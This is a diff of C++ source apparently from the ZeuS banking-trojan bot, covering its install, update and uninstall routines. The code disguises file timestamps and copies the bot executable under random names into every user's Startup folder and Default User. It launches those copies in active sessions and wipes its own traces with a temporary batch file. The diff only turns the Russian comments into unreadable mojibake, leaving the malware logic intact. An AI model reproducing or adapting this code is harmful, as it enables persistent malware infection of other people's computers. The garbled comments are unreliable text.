@@ -516,19 +527,19 @@ bool CoreInstall::_update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR cor
       WDEBUG0(WDDT_INFO, "Old bot stopped!");
     }
     
-    //Генерируем копию файла.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     if(Fs::_pathCombine(coreFile, pathHome, bs->userPaths.coreFile) && savePeFile(&pes, coreFile, true))
     {
-      //Изменяем время файлов.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       FILETIME fileTimeTemplate;
       if(Fs::_getFileTime(true, pathHome, &fileTimeTemplate, NULL, NULL))Fs::_setRandomFileTime(Time::_fileTimeToTime(&fileTimeTemplate), FILETIME_GENERATOR_RESERVED_SECONDS, coreFile, 1);
 
-      //Финал.
+      //пїЅпїЅпїЅпїЅпїЅ.
       Mem::_copy(&coreData.peSettings, &pes, sizeof(PESETTINGS));
       ok = true;
     }
     WDEBUG1(WDDT_INFO, "Updating finished with code %u.", ok);
-    Mem::_zero(&pes, sizeof(PESETTINGS)); //На всякий случай.
+    Mem::_zero(&pes, sizeof(PESETTINGS)); //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   }
 # if(BO_DEBUG > 0)
   else WDEBUG4(WDDT_WARNING, "Existing bot %u.%u.%u.%u not need update.", VERSION_MAJOR(bs->version), VERSION_MINOR(bs->version), VERSION_SUBMINOR(bs->version), VERSION_BUILD(bs->version));
@@ -542,7 +553,7 @@ void CoreInstall::_loadUpdateData(BotStatus::VER1 *bs)
   PESETTINGS pes;
   Core::getPeSettings(&pes);
 
-  //Основные данные.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   bs->structSize      = sizeof(BotStatus::VER1);
   bs->flags           = 0;
   bs->version         = BO_CLIENT_VERSION;
@@ -553,13 +564,13 @@ void CoreInstall::_loadUpdateData(BotStatus::VER1 *bs)
   bs->stopServices = stopServices;
   bs->uninstall    = uninstall;
 
-  //Привязка.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   bs->reserved = 0;
   Mem::_copy(bs->compId,  pes.compId,  sizeof(pes.compId));
   Mem::_copy(&bs->guid,   &pes.guid,   sizeof(GUID));
   Mem::_copy(&bs->rc4Key, &pes.rc4Key, sizeof(Crypt::RC4KEY));
   
-  //Данные о путях.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
   Str::_ansiToUnicode(pes.userPaths.coreFile,         -1, bs->userPaths.coreFile,         sizeof(bs->userPaths.coreFile) / sizeof(WCHAR));
   Str::_ansiToUnicode(pes.userPaths.reportFile,       -1, bs->userPaths.reportFile,       sizeof(bs->userPaths.reportFile) / sizeof(WCHAR));
   Str::_ansiToUnicode(pes.userPaths.regKey,           -1, bs->userPaths.regKey,           sizeof(bs->userPaths.regKey) / sizeof(WCHAR));
@@ -572,7 +583,7 @@ void CoreInstall::_loadUpdateData(BotStatus::VER1 *bs)
 
 bool CoreInstall::_installToAll(void)
 {
-  //Получаем предположительный путь для Startup директории.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ Startup пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   WCHAR startupPath[MAX_PATH];
   {
     typedef BOOL (WINAPI *GETDEFAULTUSERPROFILEDIRECTORYW)(LPWSTR profileDir, LPDWORD size);
@@ -632,7 +643,7 @@ bool CoreInstall::_installToAll(void)
     if(!ok)return false;
   }
   
-  //Получаем список полозователей.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   bool ok = false;
   DWORD handle = 0;
   NET_API_STATUS status;
@@ -640,9 +651,9 @@ bool CoreInstall::_installToAll(void)
   do
   {
     /*
-      Тупые, притупые идусы из MS, не понимают что они тупые притупые. Дело в том, что в MSDN
-      написано, что NetUserEnum может работать с уровнями 4, 23, а на практики мы получаем 
-      большой индуский ХУЙ!
+      пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ MS, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ MSDN
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ NetUserEnum пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 4, 23, пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+      пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ!
     */
 
     DWORD readed;
@@ -655,20 +666,20 @@ bool CoreInstall::_installToAll(void)
       USER_INFO_23 *buf23;
       for(DWORD i = 0; i < readed; i++)if(CWA(netapi32, NetUserGetInfo)(NULL, buf0[i].usri0_name, 23, (LPBYTE *)&buf23) == NERR_Success && buf23 != NULL)
       {
-        //Получаем директорию Startup.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Startup.
         WCHAR profileDir[MAX_PATH];
         if(OsEnv::_getUserProfileDirectoryhBySid(buf23->usri23_user_sid, profileDir) && Fs::_pathCombine(profileDir, profileDir, startupPath) && Fs::_createDirectoryTree(profileDir, NULL))
         {
           WDEBUG2(WDDT_INFO, "Founded user: name=[%s], profileDir=[%s].", buf23->usri23_name, profileDir);
 
-          //Делаем копию себя в профиль пользователя.
+          //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           WCHAR fileName[MAX_PATH];
           if(MalwareTools::_GenerateRandomFileName(MalwareTools::NCF_ALL_LOWER, profileDir, fileName, FILEEXTENSION_EXECUTABLE, 4, 6) && savePeFile(NULL, fileName, false))
           {
             WDEBUG1(WDDT_INFO, "Copied to \"%s\".", fileName);
             ok = true;
             
-            //Пытаемся запустить процесс.
+            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             tryToRunForActiveSessions(buf23->usri23_user_sid, fileName);
           }
 #         if(BO_DEBUG > 0)
@@ -682,7 +693,7 @@ bool CoreInstall::_installToAll(void)
   }
   while(status == ERROR_MORE_DATA);
 
-  //Ну и копируем в себя в Default User.
+  //пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅ Default User.
   if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_STARTUP | CSIDL_FLAG_CREATE, (HANDLE)-1, SHGFP_TYPE_DEFAULT, startupPath) == S_OK)
   {
     WCHAR fileName[MAX_PATH];
@@ -696,34 +707,34 @@ bool CoreInstall::_uninstall(bool wait)
   WCHAR path1[MAX_PATH];
   WCHAR path2[MAX_PATH];
   
-  //Получаем пути.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   Core::getPeSettingsPath(Core::PSP_COREFILE, path1);
   CWA(shlwapi, PathRemoveFileSpecW)(path1);
 
   Core::getPeSettingsPath(Core::PSP_REPORTFILE, path2);
   CWA(shlwapi, PathRemoveFileSpecW)(path2);
 
-  //Останавливаем потоки.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   coreData.proccessFlags |= Core::CDPF_NO_EXITPROCESS;
   stopServices(NULL);
 
-  //Удаляем автозапуск.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   CoreControl::_removeAutorun();
 
-  //Удаляем файлы из ~.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ~.
   {
     Fs::_removeDirectoryTree(path1);
     Fs::_removeDirectoryTree(path2);
   }
 
-  //Удаляем настройки в реестре.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   {
     WCHAR regPath[MAX_PATH];
     Core::getPeSettingsPath(Core::PSP_REGKEY, regPath);
     Registry::_deleteKey(HKEY_CURRENT_USER, regPath);
   }
 
-  //Создаем bat-файл. Для надежного удаления файлов.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ bat-пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   {
     char path1Oem[MAX_PATH];
     char path2Oem[MAX_PATH];
@@ -737,7 +748,7 @@ bool CoreInstall::_uninstall(bool wait)
     if(size > 0)Process::_runTempBatch(buf);
   }
 
-  //Если удаление запушено из первичного процесса бота, завершаем процесс.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(coreData.globalHandles.stopedEvent == CURRENT_PROCESS)CWA(kernel32, ExitProcess)(0);
   return true;
 }
